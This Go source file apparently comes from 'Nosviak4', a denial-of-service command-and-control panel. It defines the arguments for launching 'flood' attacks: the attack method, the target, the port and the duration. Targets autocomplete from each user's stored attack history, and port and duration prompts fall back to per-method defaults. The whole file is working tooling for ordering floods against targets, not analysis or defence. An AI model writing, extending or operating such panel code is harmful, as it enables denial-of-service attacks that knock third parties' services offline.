package commands

import (
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/masters/sessions"
	"strconv"
	"strings"

	"golang.org/x/exp/maps"
)

var (
	Descriptor *Arg = &Arg{
		Name:        "descriptor",
		Type:        ANY,
		OpenEnded:   false,
		Description: "either a command of a flood",
		Callback: func(ac *ArgContext, s *sessions.Session, i int) []string {
			if strings.HasPrefix(ac.Text[0], source.MethodConfig.Attacks.AttackPrefix) {
				methodBuf := maps.Keys(source.Methods)
				for pos := range methodBuf {
					methodBuf[pos] = source.MethodConfig.Attacks.AttackPrefix + methodBuf[pos]
				}

				/* returns an array of all methods and the prefixes are included */
				return methodBuf
			}

			customCommandBuf := make([]string, 0)
			for _, customCommand := range s.Theme.CustomCommands {
				switch index := customCommand.(type) {

				case *source.Text:
					customCommandBuf = append(customCommandBuf, index.Name)
				
				case *source.Bin:
					customCommandBuf = append(customCommandBuf, index.Name...)
				}
			}

			/* returns an array of all custom commands */
			return customCommandBuf
		},
	}

	Target *Arg = &Arg{
		Name:        "target",
		Type:        ANY,
		Description: "target for the attack",
		Callback: func(ac *ArgContext, s *sessions.Session, i int) []string {
			pastAttacks, err := database.DB.GetUserAttacks(s.User.Username)
			if err != nil {
				return make([]string, 0)
			}

			buf := make([]string, 0)
			for _, target := range pastAttacks {
				buf = append(buf, target.Target)
			}

			return buf
		},

		// We implement the forceful method within the command handler directly
		NotProvided: func(s *sessions.Session, arg []string) (string, error) {
			if !strings.HasPrefix(arg[0], source.MethodConfig.Attacks.AttackPrefix) {
				return "", nil
			}

			content, err := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "target.tfx"), s.Reader.Context).ReadLine()
			return string(content), err
		},
	}

	Port *Arg = &Arg{
		Name:        "port",
		Type:        NUMBER,
		Description: "port for the attack",
		NotProvided: func(s *sessions.Session, a []string) (string, error) {
			if !strings.HasPrefix(a[0], source.MethodConfig.Attacks.AttackPrefix) {
				return "", nil
			}	
		
			method, ok := source.Methods[a[0][len(source.MethodConfig.Attacks.AttackPrefix):]]
			if !ok || method == nil {
				return "", nil
			}

			portByte, err := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "port.tfx"), s.Reader.Context).ReadLine()
			if err != nil || len(portByte) == 0 {
				return strconv.Itoa(method.DefaultPort), err
			}

			conv, err := strconv.Atoi(string(portByte))
			if err != nil || conv == 0 {
				return strconv.Itoa(method.DefaultPort), err
			}

			return strconv.Itoa(conv), nil
		},
	}

	Duration *Arg = &Arg{
		Name:        "duration",
		Type:        NUMBER,
		Description: "duration for the attack",
		NotProvided: func(s *sessions.Session, a []string) (string, error) {
			if !strings.HasPrefix(a[0], source.MethodConfig.Attacks.AttackPrefix) {
				return "", nil
			}
			
			method, ok := source.Methods[a[0][len(source.MethodConfig.Attacks.AttackPrefix):]]
			if !ok || method == nil {
				return "", nil
			}

			durationByte, err := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "duration.tfx"), s.Reader.Context).ReadLine()
			if err != nil || len(durationByte) == 0 {
				return strconv.Itoa(method.DefaultDuration), err
			}

			conv, err := strconv.Atoi(string(durationByte))
			if err != nil || conv == 0 {
				return strconv.Itoa(method.DefaultDuration), err
			}

			return strconv.Itoa(conv), nil
		},
	}
)
